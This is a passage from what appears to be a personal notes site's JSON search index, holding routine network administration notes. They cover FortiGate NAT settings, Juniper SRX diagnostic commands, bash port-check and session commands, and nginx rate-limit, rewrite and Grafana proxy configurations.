\u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eSet NAT in FortiGate\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"1-政策物件---虛擬-ip---新增\"\u003e1. 政策\u0026amp;物件 -\u0026gt; 虛擬 IP -\u0026gt; 新增\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e名稱: IT-VPN\u003c/li\u003e\n\u003cli\u003e介面: wan2\u003c/li\u003e\n\u003cli\u003e對外 IP: 0.0.0.0\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch6 id=\"埠號轉發\"\u003e埠號轉發\u003c/h6\u003e\n\u003cul\u003e\n\u003cli\u003e協定: TCP\u003c/li\u003e\n\u003cli\u003e外部服務埠號: 19979\u003c/li\u003e\n\u003cli\u003e對應到埠號: 19979\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"2-政策物件---ipv4-政策\"\u003e2. 政策\u0026amp;物件 -\u0026gt; IPv4 政策\u003c/h5\u003e\n\u003col\u003e\n\u003cli\u003eFrom zone wan2 to zone Knowhow_Vlan\u003c/li\u003e\n\u003cli\u003eFrom any to IT-VPN\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eJuniper SRX 320\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看當前軟體版本號\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow system software\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看系統啟動時間\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow system uptime\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看硬體板卡及序號\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow chassis haredware\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看硬體板卡當前狀態\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow chassis environment\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看主控板（RE）資源使用及狀態\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow chassis routing-engine\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看當前防火牆併發會話數\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow security flow session summary\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看當前防火牆具體併發會話\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow security flow session\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 清除當前 session\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eclear security flow session all\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 檢查全域 ALG 開啟情況\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow security alg status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查OID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow snmp mib walk decimal 1.3.6.1.2.1.2.2.1.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定政策\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset security policy zones from-zone to-zone\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看路由表\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow route\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看 ARP 表\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow arp\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看系統日誌\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow log messages\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看所有介面運行狀態\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow interface terse\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看介面運行細節資訊\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow interface ge-x/y/z detail\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 比較修改\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow | compare rollback ?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow | compare rollback \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看系統\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow system\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看設定\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshow configuration\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 動態統計介面資料包轉發資訊\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emonitor interface ge-x/y/z\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 動態報文抓取（Tcpdump，類似 ScreenOS snoop命令）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emonitor traffic interface ge-x/y/z\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Network docs"},{"categories":null,"contents":" Check port status # `(echo \u0026gt;/dev/tcp/${host}/${port})` (echo \u0026gt;/dev/tcp/192.168.57.24/80) \u0026amp;\u0026gt;/dev/null \u0026amp;\u0026amp; echo \u0026#34;open\u0026#34; || echo \u0026#34;closed\u0026#34; timeout 1 bash -c \u0026#39;\u0026gt;/dev/tcp/192.168.57.24/80 \u0026amp;\u0026gt;/dev/null\u0026#39; \u0026amp;\u0026amp; echo \u0026#34;open\u0026#34; || echo \u0026#34;closed\u0026#34; timeout 1 bash -c \u0026#39;\u0026gt;/dev/tcp/192.168.57.24/80\u0026#39; \u0026amp;\u0026amp; echo \u0026#34;open\u0026#34; || echo \u0026#34;closed\u0026#34; Block subnets ip route add blackhole 192.168.0.0/24 Kill sessions # ss sudo ss -K state TIME-WAIT # or conntrack sudo conntrack -D -p tcp --state TIME_WAIT connect IPs ss -tnH state established \\ | awk \u0026#39;{ peer = $5; if (peer == \u0026#34;\u0026#34;) peer = $NF # 取 Peer Address:Port（某些版本欄位可能不同） sub(/,$/, \u0026#34;\u0026#34;, peer) # 去掉可能的逗號 gsub(/[\\[\\]]/, \u0026#34;\u0026#34;, peer) # 去掉所有中括號 gsub(/::ffff:/, \u0026#34;\u0026#34;, peer) # IPv4-mapped IPv6 無論出現在開頭還中間都移除 sub(/%[^:]+/, \u0026#34;\u0026#34;, peer) # 去掉 IPv6 的 scope（如 %eth0） sub(/:[0-9]+$/, \u0026#34;\u0026#34;, peer) # 去掉最後的 :port print peer }\u0026#39; \\ | sort | uniq -c | sort -nr websocat connect MQTT websocat -v --binary --protocol=mqtt ws://57.77.71.2:8083/mqtt ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/bash/network/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCheck port status\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# `(echo \u0026gt;/dev/tcp/${host}/${port})`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eecho \u0026gt;/dev/tcp/192.168.57.24/80\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u0026amp;\u0026gt;/dev/null \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;open\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;closed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etimeout \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e bash -c \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026gt;/dev/tcp/192.168.57.24/80 \u0026amp;\u0026gt;/dev/null\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;open\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;closed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etimeout \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e bash -c \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026gt;/dev/tcp/192.168.57.24/80\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;open\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;closed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eBlock subnets\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip route add blackhole 192.168.0.0/24\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eKill sessions\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# ss\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo ss -K state TIME-WAIT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# or conntrack\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo conntrack -D -p tcp --state TIME_WAIT\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003econnect IPs\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ess -tnH state established \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e| awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  peer = $5; if (peer == \u0026#34;\u0026#34;) peer = $NF # 取 Peer Address:Port（某些版本欄位可能不同）\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  sub(/,$/, \u0026#34;\u0026#34;, peer)                   # 去掉可能的逗號\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  gsub(/[\\[\\]]/, \u0026#34;\u0026#34;, peer)              # 去掉所有中括號\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  gsub(/::ffff:/, \u0026#34;\u0026#34;, peer)             # IPv4-mapped IPv6 無論出現在開頭還中間都移除\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  sub(/%[^:]+/, \u0026#34;\u0026#34;, peer)               # 去掉 IPv6 的 scope（如 %eth0）\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  sub(/:[0-9]+$/, \u0026#34;\u0026#34;, peer)             # 去掉最後的 :port\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  print peer\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e| sort | uniq -c | sort -nr\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ewebsocat connect MQTT\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewebsocat -v --binary --protocol\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emqtt ws://57.77.71.2:8083/mqtt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Network Related Command"},{"categories":null,"contents":" map # map map $remote_addr $limit_key { 35.229.201.209 \u0026#34;\u0026#34;; default $binary_remote_addr; } # wss.conf limit_req_zone $limit_key zone=websocket:10m rate=20r/s; limit_req_status 499; server { location = / { limit_req zone=websocket nodelay; limit_req_log_level warn; } } rewrite 1 # https://localhost/img/nginx.svg can access /data/nginxconfig.io/src/static/nginx.svg location /img { rewrite \u0026#39;^/img/(.*)$\u0026#39; /static/$1; } location /static { root /data/nginxconfig.io/src; index nginx.svg; } 2 # https://localhost/photo/nginx.svg can access /data/nginxconfig.io/src/static/nginx.svg location /photo { root /data/nginxconfig.io/src; try_files $uri /$uri @pic; } location @pic { rewrite \u0026#39;^/photo/(.*)$\u0026#39; /static/$1; } 3 # remove prefix path and allow proxy_pass POST location /upload/ { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; root /data/nginx/html; # Remove path rewrite ^/upload/(.*) /$1 break; proxy_pass https://logo$uri$is_args$args; # Proxy_pass POST proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#39;upgrade\u0026#39;; proxy_cache_bypass $http_upgrade; #proxy_redirect https://logo/ /; } location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; root /data/nginx/html; index index.html index.htm; } grafana behind nginx server/ssl.conf ssl_certificate /etc/ssl/go2cloudten.com.crt; ssl_certificate_key /etc/ssl/go2cloudten.com.key; ssl_ciphers \u0026#34;EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EECDH+aRSA+SHA256:EECDH+aRSA+RC4:EECDH:EDH+aRSA:HIGH:!RC2:!RC4:!aNULL:!eNULL:!LOW:!IDEA:!DES:!TDES:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!EXPORT:!ANON\u0026#34;; ssl_prefer_server_ciphers on; ssl_protocols TLSv1.2 TLSv1.3; ssl_session_timeout 50m; server/proxy.conf proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; grafana.conf server { listen 443 ssl; server_name grafana-test.go2cloudten.com; server_name grafana.go2cloudten.com; include server/ssl.conf; include server/proxy.conf; access_log logs/grafana.log json; error_log logs/grafana.error.log warn; location / { proxy_pass http://grafana; proxy_connect_timeout 300; proxy_read_timeout 700; proxy_send_timeout 700; proxy_set_header Host $host; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; } } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/docs/nginx/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003emap\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# map\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e $remote_addr $limit_key {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e35.229.201.209\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edefault\u003c/span\u003e $binary_remote_addr;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# wss.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elimit_req_zone\u003c/span\u003e $limit_key \u003cspan style=\"color:#e6db74\"\u003ezone=websocket:10m\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003erate=20r/s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elimit_req_status\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e499\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elimit_req\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ezone=websocket\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enodelay\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elimit_req_log_level\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 